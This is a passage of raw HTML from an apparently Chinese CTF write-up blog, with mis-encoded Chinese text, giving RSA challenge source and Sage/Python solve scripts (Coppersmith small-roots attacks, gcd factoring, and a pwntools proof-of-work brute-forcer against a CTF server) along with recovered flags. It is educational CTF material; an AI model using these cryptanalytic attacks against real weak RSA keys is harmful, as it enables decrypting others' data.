mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><h3 id="ç¬¬äºŒéƒ¨åˆ†-2"><a class="markdownIt-Anchor" href="#ç¬¬äºŒéƒ¨åˆ†-2"></a> ç¬¬äºŒéƒ¨åˆ†</h3><p>çŸ¥é“pçš„é«˜ä½ï¼Œåˆ©ç”¨coppersmithï¼ŒåŒä¸Šé¢˜ç¬¬ä¸‰éƒ¨åˆ†å¥—æ¿å­å°±è¡Œäº†</p><h3 id="ç¬¬ä¸‰éƒ¨åˆ†-2"><a class="markdownIt-Anchor" href="#ç¬¬ä¸‰éƒ¨åˆ†-2"></a> ç¬¬ä¸‰éƒ¨åˆ†</h3><p>ç»è¿‡æ¨¡pæ¨å¯¼å¯ä»¥å¾—åˆ°cç­‰äºkå€çš„pï¼Œé‚£ä¹ˆæˆ‘ä»¬çŸ¥é“nï¼Œå°±å¯ä»¥è·Ÿnæ±‚æœ€å¤§å…¬çº¦æ•°å¾—åˆ°p</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>M</mi><mo>=</mo><mn>2022</mn><mo>âˆ—</mo><mi>m</mi><mo>âˆ—</mo><mn>1011</mn><mo>âˆ—</mo><mi>p</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>M</mi><mo>=</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><msup><mi>M</mi><mi>e</mi></msup><mo>=</mo><mn>0</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><mi>k</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">M=2022*m*1011*p\quad mod(n)\\M=0 \quad mod(p)\\c=M^e=0\quad mod(p)\\c=kp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">0</span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">1</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span></span></span></span></span></p><h2 id="exp-16"><a class="markdownIt-Anchor" href="#exp-16"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>c1=<span class="hljs-number">0x27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894e</span><br>p1=<span class="hljs-number">0xbb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bd</span><br>q1=<span class="hljs-number">0xbb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1</span><br>e1=<span class="hljs-number">0x292</span><br>phi1=(p1-<span class="hljs-number">1</span>)*(q1-<span class="hljs-number">1</span>)<br>g1=gcd(e1,phi1)<br>te1=e1//g1<br>td1=invert(te1,phi1)<br>tm1=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c1,td1,p1*q1))<br>m1=long_to_bytes(iroot(tm1,<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br><br>c2=<span class="hljs-number">0x3a80caebcee814e74a9d3d81b08b1130bed6edde2c0161799e1116ab837424fbc1a234b9765edfc47a9d634e1868105d4458c9b9a0d399b870adbaa2337ac62940ade08daa8a7492cdedf854d4d3a05705db3651211a1ec623a10bd60596e891ccc7b9364fbf2e306404aa2392f5598694dec0b8f7efc66e94e3f8a6f372d833941a2235ebf2fc77c163abcac274836380045b63cc9904d9b13c0935040eda6462b99dd01e8230fdfe2871124306e7bca5b356d16796351db37ec4e574137c926a4e07a2bfe76b9cbbfa4b5b010d678804df3e2f23b4ec42b8c8433fa4811bf1dc231855bea4225683529fad54a9b539fe824931b4fdafab67034e57338217f</span><br>high_p2=<span class="hljs-number">0xa9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000</span><br>e2=<span class="hljs-number">0x10001</span><br>n2=<span class="hljs-number">0x841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65</span><br><br>unknown_bits=<span class="hljs-number">60</span><br>R.&lt;x&gt; = PolynomialRing(Zmod(n2))<br>f = high_p2 + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br>p2=<span class="hljs-built_in">int</span>(high_p2+x[<span class="hljs-number">0</span>])<br>m2=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c2,invert(e2,(p2-<span class="hljs-number">1</span>)*(n2//p2-<span class="hljs-number">1</span>)),n2)))<br><br>c3=<span class="hljs-number">0x1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0df</span><br>n3=<span class="hljs-number">0xc2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069</span><br>e3=<span class="hljs-number">0x10001</span><br>p3=<span class="hljs-built_in">int</span>(gcd(n3,c3))<br>m3=<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c3,invert(e3,(p3-<span class="hljs-number">1</span>)*(n3//p3-<span class="hljs-number">1</span>)),n3))<br>m3=long_to_bytes(m3//(p3*<span class="hljs-number">2022</span>*<span class="hljs-number">1011</span>))<br><span class="hljs-built_in">print</span>(m1+m2+m3)<br><span class="hljs-comment">#b&#x27;PCL&#123;16745c3b0c134c83b74f977260aae9b5&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;16745c3b0c134c83b74f977260aae9b5&#125;</span><br></code></pre></td></tr></table></figure><h1 id="çº¢æ˜è°·ctf-2022easy_ya"><a class="markdownIt-Anchor" href="#çº¢æ˜è°·ctf-2022easy_ya"></a> [çº¢æ˜è°·CTF 2022]easy_ya</h1><h2 id="é¢˜ç›®-17"><a class="markdownIt-Anchor" href="#é¢˜ç›®-17"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>():<br>    e = <span class="hljs-number">3</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">try</span>:<br>            p = getPrime(<span class="hljs-number">512</span>)<br>            q = getPrime(<span class="hljs-number">512</span>)<br>            n = p*q<br>            phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>            d = inverse(e,phi)<br>            <span class="hljs-keyword">return</span> p,q,d,n,e<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span><br>p,q,d,n,e = gen()<br>r = getPrime(<span class="hljs-number">512</span>)<br>m = bytes_to_long(flag+os.urandom(<span class="hljs-number">32</span>))<br>M = m%r<br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;r = %d&quot;</span>%r)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;M = %d&quot;</span>%M)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = %d&quot;</span>%n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e = %d&quot;</span>%e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = %d&quot;</span>%c)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473</span><br><span class="hljs-string">M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558</span><br><span class="hljs-string">n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287</span><br><span class="hljs-string">e = 3</span><br><span class="hljs-string">c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-17"><a class="markdownIt-Anchor" href="#åˆ†æ-17"></a> åˆ†æ</h2><p>è¿˜æ˜¯åˆ©ç”¨CopperSmith</p><p>å…·ä½“åŸç†æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼ŒåªçŸ¥é“èƒ½è¿™ä¹ˆåšï¼ˆå“­</p><h2 id="exp-17"><a class="markdownIt-Anchor" href="#exp-17"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>r = <span class="hljs-number">7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473</span><br>M = <span class="hljs-number">4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558</span><br>n = <span class="hljs-number">131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287</span><br>e = <span class="hljs-number">3</span><br>c = <span class="hljs-number">46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282</span><br><br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = (M+x*r)^e-c<br>f = f.monic()<br>x = f.small_roots()<br><span class="hljs-keyword">if</span> x:<br>    <span class="hljs-built_in">print</span>(x)<br>    m=<span class="hljs-built_in">int</span>(M+x[<span class="hljs-number">0</span>]*r)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#[810968823598060539864535]</span><br><span class="hljs-comment">#b&#x27;flag&#123;53a2e494-964d-4506-a2c4-c34b9475dedd&#125;W\xf1X6\xacP\x9bc~9\xfd\x0f\x96\xbf\x92\xb9+\xe5\xebPJ\x17\xc4\xb2\xe8\xad\x01\n\xf2j\xae\x15&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;53a2e494-964d-4506-a2c4-c34b9475dedd&#125;</span><br></code></pre></td></tr></table></figure><h1 id="å¼ºç½‘æ¯-2019copperstudy"><a class="markdownIt-Anchor" href="#å¼ºç½‘æ¯-2019copperstudy"></a> [å¼ºç½‘æ¯ 2019]copperstudy</h1><h2 id="é¢˜ç›®-18"><a class="markdownIt-Anchor" href="#é¢˜ç›®-18"></a> é¢˜ç›®</h2><p>æ²¡æœ‰é™„ä»¶ï¼Œncä¸Šå»çœ‹</p><h2 id="åˆ†æ-18"><a class="markdownIt-Anchor" href="#åˆ†æ-18"></a> åˆ†æ</h2><p>ï¼ˆå»ºè®®å…ˆçœ‹[GWCTF 2019]BabyRSA2ï¼Œå­¦ä¼šç›´æ¥åœ¨vscodeé‡Œæ‰§è¡Œsageï¼Œå› ä¸ºæ¶‰åŠåˆ°ncï¼Œç„¶åå¯ä»¥è‡ªå·±è¯•è¯•ç›´æ¥åœ¨ä¸€ä¸ªexpé‡Œå®Œæˆï¼‰</p><p>è¶Šåšè¶Šç–¯ï¼Œå¾ˆç³Ÿç³•</p><p>å…¨æ˜¯æ‰¾æ¿å­ï¼Œæƒ³çœ‹åŸç†çœ‹å…·ä½“expé‡Œç„¶åå–æœå§</p><p>è¿™é‡Œæ˜¯æœ‰æ¿å­</p><h2 id="exp-18"><a class="markdownIt-Anchor" href="#exp-18"></a> exp</h2><h3 id="ç¬¬ä¸€æ­¥"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€æ­¥"></a> ç¬¬ä¸€æ­¥</h3><p>ncè¿æ¥ï¼Œç„¶åç›´æ¥çˆ†ç ´</p><p>ä¹‹åä¿æŒè¿æ¥ï¼Œåé¢å°±æ‰‹åŠ¨è¾“å…¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br>p=remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="hljs-number">28421</span>)<br><span class="hljs-built_in">print</span>(p.recvline())<br>p.recvuntil(<span class="hljs-string">b&#x27;hexdigest()=&#x27;</span>)<br>sha=(p.recvline().decode()).strip()<br><span class="hljs-built_in">print</span>(sha.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;skr[0:5].encode(&#x27;hex&#x27;)=&quot;</span>)<br>pre_skr=(p.recvline().decode()).strip()<br><span class="hljs-built_in">print</span>(pre_skr.encode())<br><span class="hljs-built_in">print</span>(p.recvuntil(<span class="hljs-string">b&quot;skr.encode(&#x27;hex&#x27;)=&quot;</span>))<br>temp=<span class="hljs-string">&quot;0123456789abcdef&quot;</span><br>fl=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> temp:<br>            <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> temp:<br>                <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> temp:<br>                    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> temp:<br>                        skr=<span class="hljs-built_in">int</span>(pre_skr+i+j+k+l+m+n,<span class="hljs-number">16</span>)<br>                        skr=long_to_bytes(skr)<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(hashlib.sha256(skr).hexdigest()) == sha:<br>                            <span class="hljs-built_in">print</span>(skr.<span class="hljs-built_in">hex</span>())<br>                            p.sendline(<span class="hljs-built_in">str</span>(skr.<span class="hljs-built_in">hex</span>()).encode())<br>                            fl=<span class="hljs-number">1</span><br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> fl:<br>                        <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> fl:<br>                    <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> fl:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> fl:<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> fl:<br>        <span class="hljs-keyword">break</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ­¥"><a class="markdownIt-Anchor" href="#ç¬¬äºŒæ­¥"></a> ç¬¬äºŒæ­¥</h3><p>mçš„é«˜ä½æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n=<span class="hljs-number">16017962047981034439379147851871655991715523372130499591852000402972024053592619510623839612271064518084046813489696243662115859838347110076313512984252332977601217689166917112436536161737721874651780063000862202462029857462549195260675764694966296233199436592988341616312096302239910999510720139029804993110147203819277344583064534236243526036059624654235721115483341283815742379122011040983246073311540204563363560614990222916022071722333723544827566195478776465318605614524315368708097920766178242152179015998515592146063110842222141971840122508556233670514825282525191089330615519445235293437744571216306171297139</span><br>e= <span class="hljs-number">3</span><br>m_high=<span class="hljs-number">653524334392227600570363162383764937305248031854419023410931365363426067123844229856737844264960</span><br>c=<span class="hljs-number">279116358436840580445598969421610529050633733034686489455738062242484915123166426001912178374020325810905517077211915812323425704202427412835294016600968491811813422933962866712907267434038126911651594486545661906271625545257899553405201093150339568388337402642643112619054191820421155173</span><br>unknown_bits=<span class="hljs-number">72</span><br><br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>m = m_high + x<br>f = m^e - c<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br><span class="hljs-keyword">if</span> x:<br>    m = m_high + x[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#4e53534354467b35643366363566366163303966613064303162383838626336643335616234347d</span><br></code></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰æ­¥"><a class="markdownIt-Anchor" href="#ç¬¬ä¸‰æ­¥"></a> ç¬¬ä¸‰æ­¥</h3><p>pé«˜ä½æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 